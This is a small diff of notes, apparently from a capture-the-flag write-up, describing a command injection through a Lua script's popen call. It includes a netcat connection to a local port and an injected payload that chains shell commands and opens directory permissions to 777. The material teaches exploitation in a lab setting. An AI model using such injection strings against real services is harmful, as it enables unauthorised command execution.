@@ -1,6 +1,4 @@
-# We started to search for the right hash but it s
-# wrong path.
+# We started to search for the right hash but it was not the answer.
 # In the Lua script there a popen that execute a command shell
 # first nc 127.0.0.1 5151 
-# then type "lol; getflag > tmp/11/flag;ls"
-# dont forget to chmod 777 /tmp/10
+# then type "lol; mkdir -p /tmp/11;chmod 777 /tmp/11;getflag > tmp/11/flag;ls"
